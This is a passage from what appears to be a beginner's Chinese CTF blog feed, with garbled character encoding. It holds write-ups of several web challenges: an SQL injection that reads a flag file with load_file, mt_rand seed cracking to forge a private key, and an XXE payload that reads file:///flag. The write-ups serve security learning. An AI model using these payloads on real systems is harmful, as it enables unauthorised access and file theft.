alt="wdb2018comment18"></p><p>å…¨é€‰ä¹‹åè§£ç ï¼Œèƒ½å‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/wdb2018comment20.png" alt="wdb2018comment20"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/img/wdb2018comment21.png" alt="wdb2018comment21"></p><p>ç„¶ååå…­è¿›åˆ¶è§£ç å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;99773ebf-cc83-4cda-a092-a9e1a14af733&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿæœ‰ä¸“é—¨è¯»<code>DS_Store</code>è¿™ç§æ–‡ä»¶çš„å·¥å…·ï¼š<code>https://github.com/gehaxelt/Python-dsstore</code></p><p>ç”¨æ³•ä¹Ÿå¾ˆç®€å•ï¼š</p><p><img src="/img/wdbcomment30.png" alt="wdbcomment30"></p><p>æ³¨æ„è¿™é‡Œæˆ‘ä»¬è·å¾—åå…­è¿›åˆ¶æ•°æ®åï¼Œå…ˆæŠŠåå…­è¿›åˆ¶æ–‡ä»¶(å†…å®¹å¤åˆ¶ç²˜è´´ï¼Œ<code>txt</code>)è½¬æ¢æˆäºŒè¿›åˆ¶æ–‡ä»¶å†æ“ä½œæ‰è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_file_to_binary</span>(<span class="hljs-params">hex_file_path, binary_file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(hex_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> hex_file:<br>        hex_string = hex_file.read().replace(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        binary_string = <span class="hljs-built_in">bytes</span>.fromhex(hex_string).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(binary_file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> binary_file:<br>        binary_file.write(binary_string.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br><br><br>hex_file_path = <span class="hljs-string">&#x27;d:/hexwhat.txt&#x27;</span><br>binary_file_path = <span class="hljs-string">&#x27;d:/biwhat.txt&#x27;</span><br><br>hex_file_to_binary(hex_file_path, binary_file_path)<br></code></pre></td></tr></table></figure><p><img src="/img/wdbcomment99.png" alt="wdbcomment99"></p><p>åé¢æ­¥éª¤ä¸€æ ·å°±ä¸å†™äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_8</title>
    <link href="/2023/12/28/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_8/"/>
    <url>/2023/12/28/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_8/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>æºç æ³„éœ²ï¼Œå­˜åœ¨<code>www.zip</code>ï¼Œä¸‹è½½å¾—åˆ°<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=<span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        <span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$result</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings2</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>  &#125;<br>  <span class="hljs-variable">$Public_key</span> = <span class="hljs-title function_ invoke__">public_key</span>();<br>  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure><p>ä»£ç å¾ˆå¥½ç†è§£ï¼šå…ˆ<code>POST</code>ä¸€ä¸ª<code>login</code>å‚æ•°(<code>isset</code>åˆ¤æ–­çš„æ‰€ä»¥éšä¾¿å†™)ã€‚å†<code>POST</code>ç”¨æˆ·åå¯†ç å’Œç§é’¥ï¼Œæ³¨æ„è¿™é‡Œæš‚æ—¶ä¸ä¼šéªŒè¯ç”¨æˆ·åå’Œå¯†ç ï¼Œåªè¦ç§é’¥å¯¹ä¸Šå°±èƒ½ç»§ç»­ä¸‹ä¸€æ­¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>$getuser <span class="hljs-operator">=</span> &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.<span class="hljs-string">&#x27;;&#x27;</span>; <br><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œï¼Œ<code>username</code>éšä¾¿å†™ï¼Œä½†å¯†ç ä¸€å®šè¦å¯¹ä¸Šæ˜¯<code>crispr</code>çš„å¯†ç ã€‚æƒ³äº†æƒ³å®ƒè²Œä¼¼æ²¡å¯¹<code>password</code>è¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥<code>1&#39;or 1=1#</code>å°±è¡Œã€‚</p><p>è‡³äº<code>mt_rand</code>è¿™ä¸œè¥¿ï¼Œ<code>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</code>åšè¿‡ä¸€éã€‚å¤§è‡´æ„æ€å°±æ˜¯è¿™ä¸ªéšæœºæ•°å…¶å®æ˜¯ä¼ªéšæœºæ•°ï¼Œæ˜¯ç”±ç§å­ç”Ÿæˆçš„ã€‚æ‰¾åˆ°å¯¹åº”çš„ç§å­ç”Ÿæˆçš„éšæœºæ•°é¡ºåºå¯ä»¥ä¿è¯ç™¾åˆ†ç™¾ä¸€è‡´(ä¸è¿‡PHPç‰ˆæœ¬è¦ä¸€æ ·ï¼Ÿ)</p><p><code>php_mt_seed</code>éœ€è¦çš„å‚æ•°:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-variable">$string</span>=<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">16</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br> <span class="hljs-variable">$pos</span>=<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str_long1</span>,<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]); <span class="hljs-comment">//strposä¼šè¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä»0å¼€å§‹</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; 0 61 &quot;</span> ;  <span class="hljs-comment">//é•¿åº¦62ï¼Œä»0åˆ°61</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span><br></code></pre></td></tr></table></figure><p>çœŸæœäº†ä¸çŸ¥é“æˆ‘è¿™ä¸ª<code>mt_seed</code>æŠ½ä»€ä¹ˆé£è·‘å¥½ä¹…è·‘ä¸å‡ºæ¥ç»“æœ,å—çš„:</p><p><img src="/img/ezaduit3.png" alt="ezaduit3"></p><p>è·‘äº†åŠå¤©ç»ˆäºå‡ºæ¥äº†ï¼š</p><p><img src="/img/ezaudit3.png" alt="ezaudit3"></p><p>ç”Ÿæˆç§é’¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">1775196155</span>);    <span class="hljs-comment">//åœ¨è¿™é‡Œå¡«å…¥è·å¾—çš„ç§å­</span><br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><br><span class="hljs-variable">$str2</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len2</span>=<span class="hljs-number">16</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len2</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str2</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$str2</span>);<br><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">12</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//XuNhoueCDCGc</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸€å®šè¦å…ˆç”Ÿæˆå…¬é’¥å†ç”Ÿæˆç§é’¥ï¼Œç”¨é¢˜ç›®é‡Œçš„ä»£ç ä¹Ÿè¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">1775196155</span>);<br><span class="hljs-comment">//å…¬é’¥</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">16</span></span>) </span>&#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$public_key</span>;<br>&#125;<br><span class="hljs-comment">//ç§é’¥</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">12</span></span>) </span>&#123;<br><br><span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br><span class="hljs-variable">$private_key</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$strings2</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$private_key</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">public_key</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">private_key</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ç™»å½•å°±è¡Œ</p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p><code>about.php</code></p><p><img src="/img/webunagi1.png" alt="webunagi1"></p><p><code>upload.php</code>å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œç„¶åç»™äº†ä¸ªä¸Šä¼ æ–‡ä»¶å½¢å¼çš„ä¾‹å­ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>alice<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Alice<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>alice@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>XXE:</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">users</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>xxe<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä¸€å¼€å§‹æ”¾åˆ°<code>&lt;group&gt;</code>é‡Œäº†ï¼Œç»“æœå¯¼è‡´æ˜¾ç¤ºä¸å®Œå…¨ã€‚ã€‚</p><p>ä¸Šä¼ åæç¤ºï¼š</p><p><img src="/img/webagi2.png" alt="webagi2"></p><p>è§¦å‘äº†<code>WAF</code>ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>å‚è€ƒï¼š<br>https:<span class="hljs-regexp">//</span>johnfrod.top<span class="hljs-regexp">/ctf/</span>csawqual-<span class="hljs-number">2019</span>unagi/<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">4059</span><span class="hljs-comment">#toc-4</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_54929891/</span>article<span class="hljs-regexp">/details/</span><span 